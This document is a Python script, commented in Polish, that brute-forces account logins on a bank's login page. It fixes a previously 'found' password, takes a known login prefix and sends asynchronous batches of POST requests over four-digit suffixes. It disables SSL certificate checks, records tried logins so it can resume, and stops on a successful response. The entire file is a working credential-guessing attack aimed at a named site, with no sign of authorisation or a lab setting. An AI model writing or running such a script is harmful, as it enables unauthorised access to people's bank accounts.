import aiohttp
import asyncio
import ssl
import os

# Wyłączanie weryfikacji certyfikatów SSL
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# Ścieżka do pliku z wynikami
RESULTS_FILE = "results.txt"

# Dane wejściowe
url = "https://kingbank.pl/logowanie"  # Adres endpointu logowania
password = "summer"  # Znalezione hasło
known_part = "pawpie"  # Pierwsze 6 liter loginu

# Funkcja do zapisu wyników
def save_result(login, status):
    with open(RESULTS_FILE, "a") as file:  # Otwieranie w trybie dopisywania
        file.write(f"{login},{status}\n")

# Funkcja do wczytania istniejących wyników
def load_checked_logins():
    if not os.path.exists(RESULTS_FILE):
        return set()
    with open(RESULTS_FILE, "r") as file:
        return set(line.split(",")[0] for line in file.readlines())

# Funkcja wysyłająca żądanie
async def send_request(session, login):
    payload = {
        "login": login,
        "password": password,
        "action": "login"
    }
    try:
        async with session.post(url, data=payload, ssl=ssl_context) as response:
            status = response.status
            print(f"Login: {login}, Status: {status}")
            save_result(login, status)  # Zapisujemy wynik do pliku
            if status == 200:  # Zatrzymujemy, jeśli login jest poprawny
                print(f"Znaleziono login: {login}")
                return login
    except Exception as e:
        print(f"Błąd dla loginu {login}: {e}")

# Funkcja do wyboru loginów w bardziej optymalny sposób
def generate_login_batches(start, end, batch_size):
    import random
    numbers = list(range(start, end))
    random.shuffle(numbers)  # Losowe mieszanie liczb
    for i in range(0, len(numbers), batch_size):
        yield numbers[i:i + batch_size]

# Funkcja obsługująca żądania w paczkach
async def brute_force_logins(start, end, batch_size=100):
    checked_logins = load_checked_logins()  # Wczytanie sprawdzonych loginów
    print(f"Załadowano {len(checked_logins)} sprawdzonych loginów.")
    
    async with aiohttp.ClientSession() as session:
        for batch in generate_login_batches(start, end, batch_size):
            tasks = []
            for digits in batch:
                login = f"pawpie{digits:04d}"
                if login in checked_logins:  # Pomijamy już sprawdzone loginy
                    continue
                tasks.append(send_request(session, login))
            results = await asyncio.gather(*tasks)
            if any(results):  # Jeśli znajdziemy poprawny login, zatrzymujemy
                break

# Główna funkcja
if __name__ == "__main__":
    start = int(input("Podaj początek zakresu (np. 0): "))
    end = int(input("Podaj koniec zakresu (np. 10000): "))
    asyncio.run(brute_force_logins(start, end, batch_size=100))